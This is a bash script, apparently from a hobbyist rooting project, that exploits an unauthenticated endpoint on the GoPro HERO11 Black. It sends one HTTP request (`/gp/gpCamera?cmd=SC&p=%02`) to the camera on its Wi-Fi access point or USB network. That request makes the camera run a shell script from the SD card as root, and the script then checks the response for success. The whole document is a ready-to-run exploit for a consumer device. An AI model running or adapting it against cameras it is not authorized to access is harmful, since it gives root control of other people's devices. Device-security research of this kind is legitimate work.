#!/usr/bin/env bash
# Root your own GoPro HERO11 Black through the unauthenticated /gp/gpCamera
# proxy: command "SC", payload byte 0x02 -> gpNet RTsetSC ->
# system("/tmp/fuse_d/scheduled_capture.sh&") as root.
#
# Prerequisites:
#   - scheduled_capture.sh at the root of the SD card, card in the camera
#   - a network path to the camera (Wi-Fi AP or USB NCM)
#
# Usage:
#   ./root-sc.sh                          # camera AP, default 10.5.5.9
#   ./root-sc.sh http://172.23.148.51     # USB NCM
#
# Success: HTTP 200 with a one-byte 0x00 body (the 0x45 status from gpNet).
# The handler returns success even if the script file is missing, so always
# verify by reading /ROOTED.txt off the card (or DCIM/100GOPRO/ROOTED.TXT in
# the media list).
set -u

BASE="${1:-http://10.5.5.9}"
BODY="$(mktemp)"
trap 'rm -f "$BODY"' EXIT

if ! curl -s -m 5 -o /dev/null "$BASE/gp/gpControl/info"; then
    echo "error: $BASE/gp/gpControl/info unreachable" >&2
    echo "       Wi-Fi: enable wireless on the camera, join its AP, camera = 10.5.5.9" >&2
    echo "       USB:   plug in, 'ip addr add 172.23.148.52/24 dev <enx...>', camera = 172.23.148.51" >&2
    exit 2
fi

echo "GET $BASE/gp/gpCamera?cmd=SC&p=%02"
code=$(curl -s -m 12 -o "$BODY" -w '%{http_code}' "$BASE/gp/gpCamera?cmd=SC&p=%02")
rc=$?
size=$(stat -c %s "$BODY" 2>/dev/null || echo 0)
printf 'curl exit=%s http=%s bytes=%s body=' "$rc" "$code" "$size"
xxd -p "$BODY" 2>/dev/null || true

if [ "$code" = "200" ] && [ "$size" = "1" ] && [ "$(xxd -p "$BODY")" = "00" ]; then
    echo "OK: SC accepted (status 0)."
    echo "If scheduled_capture.sh was at the card root it has now run as root."
    exit 0
fi

echo "unexpected response (see README: troubleshooting)" >&2
exit 1
